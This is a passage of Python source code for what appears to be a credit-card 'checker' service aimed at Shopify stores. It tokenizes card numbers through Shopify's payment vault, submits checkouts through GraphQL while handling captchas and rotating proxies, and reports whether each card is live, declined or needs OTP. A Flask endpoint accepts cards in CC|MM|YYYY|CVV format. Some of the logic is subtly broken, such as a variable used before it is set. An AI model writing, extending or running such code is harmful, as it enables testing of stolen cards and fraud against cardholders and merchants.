            if ident_sig:
                vault_headers['shopify-identification-signature'] = ident_sig
            
            try:
                response = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers, proxy=proxy, timeout=10)
                response.raise_for_status()
                token_data = await response.json()
                token = token_data.get('id')
                if not token:
                    return False, 'Unable to get payment token', gateway, total_price, currency
            except aiohttp.ClientError as e:
                return False, f'Unable to get payment token (network error): {e}', gateway, total_price, currency
            except asyncio.TimeoutError:
                return False, 'Unable to get payment token (timed out)', gateway, total_price, currency
            except json.JSONDecodeError as e:
                return False, f'Unable to get payment token (invalid JSON): {e} - Raw: {await response.text()[:200]}', gateway, total_price, currency
            except Exception as e:
                return False, f'Unable to get payment token (unexpected error): {e}', gateway, total_price, currency

            params = {'operationName': 'SubmitForCompletion'}
            
            submit_variables = {
                'input': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {
                                'streetAddress': {
                                    'address1': street, 'address2': address2, 'city': city,
                                    'countryCode': country_code, 'postalCode': s_zip,
                                    'firstName': firstName, 'lastName': lastName,
                                    'zoneCode': state, 'phone': phone
                                }
                            },
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyByHandle': {
                                    'handle': delivery_strategy if delivery_strategy else '',
                                    'customDeliveryRate': False
                                },
                                'options': {'phone': phone}
                            },
                            'targetMerchandiseLines': {
                                'lines': [{'stableId': stableId or '1'}]
                            },
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {
                                'value': {'amount': str(shipping_amount), 'currencyCode': currency}
                            },
                            'destinationChanged': False
                        }],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': True,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True
                    },
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId or '1',
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {
                                'value': {'amount': subtotal, 'currencyCode': currency}
                            },
                            'lineComponentsSource': None,
                            'lineComponents': []
                        }]
                    },
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [{
                            'paymentMethod': {
                                'directPaymentMethod': {
                                    'paymentMethodIdentifier': payment_identifier,
                                    'sessionId': token,
                                    'billingAddress': {
                                        'streetAddress': {
                                            'address1': street, 'address2': address2,
                                            'city': city, 'countryCode': country_code,
                                            'postalCode': s_zip, 'firstName': firstName,
                                            'lastName': lastName, 'zoneCode': state,
                                            'phone': phone
                                        }
                                    },
                                    'cardSource': None
                                }
                            },
                            'amount': {
                                'value': {'amount': running_total, 'currencyCode': currency}
                            },
                            'dueAt': None
                        }],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': street, 'address2': address2,
                                'city': city, 'countryCode': country_code,
                                'postalCode': s_zip, 'firstName': firstName,
                                'lastName': lastName, 'zoneCode': state,
                                'phone': phone
                            }
                        }
                    },
                    'buyerIdentity': {
                        'email': email,
                        'phone': {'number': phone, 'countryCode': country_code},
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
                        'rememberMe': False
                    },
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {
                            'value': {'amount': str(tax_amount), 'currencyCode': currency}
                        },
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []
                    },
                    'tip': {'tipLines': []},
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'optionalDuties': {'buyerRefusesDuties': False}
                },
                'attemptToken': "", # This needs to be dynamically obtained if required
                'metafields': [],
                'analytics': {'requestUrl': url}
            }
            
            if checkpoint_data:
                submit_variables['input']['checkpointData'] = checkpoint_data
            
            submit_json_data = {
                'query': MUTATION_SUBMIT,
                'variables': submit_variables,
                'operationName': 'SubmitForCompletion'
            }

            response, text, captcha_solved = await make_graphql_request_with_captcha_handling(
                session, graphql_url, params, headers, submit_json_data, url, max_retries=3
            )
            
            if is_captcha_required(text):
                return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency
            
            if not response:
                return False, f"Submit request failed: {text}", gateway, total_price, currency

            if "Your order total has changed." in text:
                return False, "Site not supported", gateway, total_price, currency
            if "The requested payment method is not available." in text:
                return False, "Payment method not available", gateway, total_price, currency
            
            try:
                resp_json = json.loads(text)
                submit_data = resp_json.get('data', {}).get('submitForCompletion', {})
                
                if not submit_data:
                    errors = resp_json.get('errors', [])
                    if errors:
                        for error in errors:
                            code = error.get('code')
                            if code:
                                return False, code, gateway, total_price, currency
                    return False, "Empty submit response", gateway, total_price, currency
                
                result_type = submit_data.get('__typename', '')
                
                if result_type in ['SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted']:
                    receipt = submit_data.get('receipt', {})
                    if receipt:
                        receipt_type = receipt.get('__typename', '')
                        
                        if receipt_type == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        
                        rid = receipt.get('id')
                    else:
                        return False, "SubmitSuccess but no receipt", gateway, total_price, currency
                
                elif result_type == 'SubmitFailed':
                    reason = submit_data.get('reason', 'Unknown reason')
                    return False, extract_clean_response(reason), gateway, total_price, currency
                
                elif result_type == 'SubmitRejected':
                    errors = submit_data.get('errors', [])
                    if errors:
                        for error in errors:
                            code = error.get('code', '')
                            localized_msg = error.get('localizedMessage', '')
                            non_localized_msg = error.get('nonLocalizedMessage', '')
                            if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and detail:
                                detail = localized_msg or non_localized_msg
                                if detail:
                                    return False, detail, gateway, total_price, currency
                            if code:
                                return False, code, gateway, total_price, currency
                    return False, "Submit Rejected", gateway, total_price, currency
                
                elif result_type == 'Throttled':
                    return False, "Throttled", gateway, total_price, currency
                
                receipt = submit_data.get('receipt', {})
                if not receipt:
                    return False, "No receipt in submit response", gateway, total_price, currency
                
                rid = receipt.get('id')
                if not rid:
                    return False, "No receipt ID", gateway, total_price, currency
                
            except json.JSONDecodeError:
                return False, f"Invalid JSON in submit response: {text[:200]}", gateway, total_price, currency
            except Exception as e:
                return False, f"Error parsing submit: {str(e)}", gateway, total_price, currency

            params = {'operationName': 'PollForReceipt'}
            poll_json_data = {
                'query': QUERY_POLL,
                'variables': {'receiptId': rid, 'sessionToken': sst},
                'operationName': 'PollForReceipt'
            }

            await asyncio.sleep(1.5)
            
            for i in range(4):
                response, final_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, poll_json_data, 
                    url, max_retries=3
                )
                
                if is_captcha_required(final_text):
                    return True, "CARD_DECLINED", gateway, total_price, currency
                
                if not response:
                    return False, f"Poll request failed: {final_text}", gateway, total_price, currency

                try:
                    poll_json = json.loads(final_text)
                    receipt_data = poll_json.get('data', {}).get('receipt', {})
                    
                    if receipt_data:
                        typename = receipt_data.get('__typename', '')
                        
                        if typename == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        elif typename == 'FailedReceipt':
                            error = receipt_data.get('processingError', {})
                            error_type = error.get('__typename', '')
                            if error_type == 'PaymentFailed':
                                code = error.get('code', '')
                                msg = error.get('messageUntranslated', '')
                                if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and msg:
                                    return True, msg, gateway, total_price, currency
                                return True, code if code else 'PAYMENT_FAILED', gateway, total_price, currency
                            code = error.get('code') or error_type or 'UNKNOWN_ERROR'
                            return True, code, gateway, total_price, currency
                        elif typename == 'ActionRequiredReceipt':
                            return True, "OTP_REQUIRED", gateway, total_price, currency
                        
                        if receipt_data.get('__typename') in ['ProcessingReceipt', 'WaitingReceipt']:
                            await asyncio.sleep(1.5)
                            continue
                        
                except json.JSONDecodeError:
                    print(f"Invalid JSON in poll response: {final_text[:200]}")
                    # Continue polling if JSON is invalid, might be a temporary issue
                    await asyncio.sleep(1.5)
                    continue
                except Exception as e:
                    print(f"Error parsing poll response: {e}")
                    await asyncio.sleep(1.5)
                    continue
                
                if 'WaitingReceipt' in final_text:
                    await asyncio.sleep(1.5)
                else:
                    break
            
            if 'CAPTCHA_REQUIRED' in final_text:
                return True, "CARD_DECLINED", gateway, total_price, currency
            
            if 'WaitingReceipt' in final_text:
                return False, "Change Proxy or Site", gateway, total_price, currency
            
            try:
                res_json = json.loads(final_text)
                result = res_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code')
                
                if "shopify_payments" in str(res_json):
                    return True, "ORDER_PLACED", gateway, total_price, currency
                elif result:
                    return True, result, gateway, total_price, currency
                else:
                    return True, "MISMATCHED_BILL", gateway, total_price, currency
            except json.JSONDecodeError:
                return False, f"Invalid JSON in final poll response: {final_text[:200]}", gateway, total_price, currency
            except Exception as e:
                return False, f"Error parsing final poll: {str(e)}", gateway, total_price, currency
            
            code = extract_between(final_text, '{"code":"', '"')
            
            final_lower = final_text.lower()
            if 'actionreq' in final_lower or 'action_required' in final_lower:
                return True, f"OTP_REQUIRED", gateway, total_price, currency
            elif 'processedreceipt' in final_lower:
                return True, f"ORDER_PLACED", gateway, total_price, currency
            elif 'failedreceipt' in final_lower or 'declined' in final_lower:
                return True, code if code else "CARD_DECLINED", gateway, total_price, currency
            else:
                return False, f"Unknown Result", gateway, total_price, currency

    except Exception as e:
        return False, f"Error Processing Card: {str(e)}", gateway, total_price, currency

def parse_cc_string(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    return {
        'cc': parts[0].strip(),
        'mes': parts[1].strip(),
        'ano': parts[2].strip(),
        'cvv': parts[3].strip()
    }

app = Flask(__name__)

@app.route('/shopify', methods=['GET'])
async def shopify_checker(): # Changed to async
    try:
        site = request.args.get('site')
        cc_string = request.args.get('cc')
        proxy_str = request.args.get('proxy')
        variant_id = request.args.get('variant')
        
        if not site:
            return jsonify({
                "error": "Missing 'site' parameter",
                "status": False
            }), 400
        
        if not cc_string:
            return jsonify({
                "error": "Missing 'cc' parameter in format CC|MM|YYYY|CVV",
                "status": False
            }), 400
        
        try:
            cc_parts = parse_cc_string(cc_string)
            cc = cc_parts['cc']
            mes = cc_parts['mes']
            ano = cc_parts['ano']
            cvv = cc_parts['cvv']
        except ValueError as e:
            return jsonify({
                "error": str(e),
                "status": False
            }), 400
        
        # Directly await the async function
        success, message, gateway, price, currency = await process_card(cc, mes, ano, cvv, site, variant_id, proxy_str)
        
        clean_response = extract_clean_response(message)
        
        response_data = {
            "Gateway": gateway,
            "Price": float(price) if price and price.replace('.', '', 1).isdigit() else 0.0,
            "Response": clean_response,
            "Status": success,
            "cc": cc_string
        }
        
        return jsonify(response_data)
        
    except Exception as e:
        print(f"Unhandled exception in shopify_checker: {e}")
        return jsonify({
            "error": str(e),
            "status": False,
            "Gateway": "UNKNOWN",
            "Price": 0.0,
            "Response": f"ERROR: {str(e)}",
            "cc": request.args.get('cc', '')
        }), 500

if __name__ == "__main__":
    # Use uvicorn to run the Flask app as an ASGI application
    # This allows the async routes to be properly handled
    uvicorn.run(app, host='0.0.0.0', port=5000, debug=False)
